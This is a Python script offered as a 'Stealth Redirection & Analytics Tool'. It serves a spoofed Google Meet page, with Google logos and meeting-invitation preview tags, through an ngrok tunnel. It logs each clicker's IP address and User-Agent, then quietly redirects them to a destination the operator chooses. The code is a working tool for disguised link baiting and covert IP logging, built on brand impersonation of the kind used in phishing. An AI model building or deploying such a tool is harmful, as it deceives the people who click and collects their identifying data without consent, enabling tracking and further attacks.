import os
import socket
import requests
from flask import Flask, redirect, request, render_template_string
from pyngrok import ngrok
from google.colab import output
import getpass

app = Flask(__name__)

# --- ASCII BANNER ---
BANNER = r"""
              .__                                 _____              
 __ _________|  |      ____________   ____   _____/ ____\___________ 
|  |  \_  __ \  |     /  ___/\____ \ /  _ \ /  _ \   __\/ __ \_  __ \
|  |  /|  | \/  |__   \___ \ |  |_> >  <_> |  <_> )  | \  ___/|  | \/
|____/ |__|  |____/ /____  >|   __/ \____/ \____/|__|   \___  >__|   
                         \/ |__|                            \/       
          [ Stealth Redirection & Analytics Tool ]
"""

# --- CONFIGURATION & TEMPLATES ---
research_data = {"target_url": "", "alias": ""}

PREVIEW_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Google Meet</title>
    <meta property="og:title" content="Join our Cloud Meeting - Google Meet">
    <meta property="og:description" content="Real-time meetings by Google. Share your video and desktop.">
    <meta property="og:image" content="https://fonts.gstatic.com/s/i/productlogos/meet_2020q4/v6/web-512dp/logo_meet_2020q4_color_2x_web_512dp.png">
    <script type="text/javascript">
        setTimeout(function() { window.location.href = "{{ target }}"; }, 500);
    </script>
    <style>
        body { font-family: 'Roboto', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f8f9fa; }
        .loader { text-align: center; }
    </style>
</head>
<body>
    <div class="loader">
        <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="150">
        <p>Redirecting you to your meeting...</p>
    </div>
</body>
</html>
"""

@app.route('/<path_alias>')
def stealth_redirect(path_alias):
    if path_alias == research_data["alias"]:
        print(f"\n[!] ALERT: Link clicked by {request.remote_addr}")
        print(f"    User-Agent: {request.headers.get('User-Agent')}")
        return render_template_string(PREVIEW_TEMPLATE, target=research_data["target_url"])
    return "Link Expired", 404

def run_server():
    # Print the Banner first
    print(BANNER)
    
    print("Step 1: Authenticate with Ngrok")
    token = getpass.getpass("Enter your Ngrok Authtoken: ")
    
    print("\nStep 2: Setup Redirection")
    target = input("Enter the real destination URL: ")
    research_data["target_url"] = target if target.startswith("http") else "https://" + target
    research_data["alias"] = input("Enter the spoof alias (no /): ")

    # Authenticate and Tunnel
    ngrok.set_auth_token(token)
    public_url = ngrok.connect(5000).public_url
    
    print(f"\n" + "="*50)
    print(f"DEPLOYMENT LIVE")
    print(f"Public Link: {public_url}/{research_data['alias']}")
    print(f"="*50)
    print("\n[Waiting for clicks...]")
    
    app.run(port=5000)

if __name__ == "__main__":
    run_server()
